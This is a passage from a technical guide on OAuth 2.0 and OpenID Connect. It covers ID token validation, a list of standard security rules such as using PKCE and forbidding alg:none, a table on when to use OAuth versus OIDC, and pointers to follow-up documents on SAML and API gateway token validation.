OIDC: client app must additionally validate the ID token:
✅ aud         — must equal your client_id
✅ nonce       — must match what you sent in the auth request
✅ at_hash     — if present, must match the access token (optional but good practice)
```

### Security rules — the non-negotiables

```
1.  Always use PKCE for Authorization Code flows
2.  Always validate the state parameter on callback
3.  Never store tokens in localStorage
4.  Never put tokens in URL query strings
5.  Never send the ID token to an API
6.  Never use the email claim as a unique user identifier — use sub
7.  Always explicitly set allowed signing algorithms (never allow alg:none)
8.  Always validate iss and aud claims on the resource server
9.  Enable refresh token rotation
10. Store client_secret in a secrets manager, never in source code
```

### OAuth 2.0 vs OIDC — when you need which

| Need | Use |
|---|---|
| App calling an API | OAuth 2.0 |
| App needs to know who the user is | OAuth 2.0 + OIDC |
| SSO across multiple apps | OAuth 2.0 + OIDC |
| "Sign in with Google/Apple/Microsoft" | OIDC |
| Service-to-service API calls | OAuth 2.0 (Client Credentials only) |

---

## What comes next

This document covers the OAuth 2.0 + OIDC protocols only. The next documents in this series:

1. **SAML 2.0** — the enterprise XML-based federation protocol, how it compares to OIDC, SP-initiated vs IdP-initiated flows, assertions, and when organisations still need it
2. **Apigee + PingFederate** — how to implement OAuth/OIDC token validation at the API gateway layer using Apigee policies and PingFederate as the Auth Server

---

*OAuth 2.0: RFC 6749 | PKCE: RFC 7636 | Device Code: RFC 8628 | JWT: RFC 7519 | JWKS: RFC 7517 | OIDC Core 1.0 | OAuth 2.1: draft-ietf-oauth-v2-1*
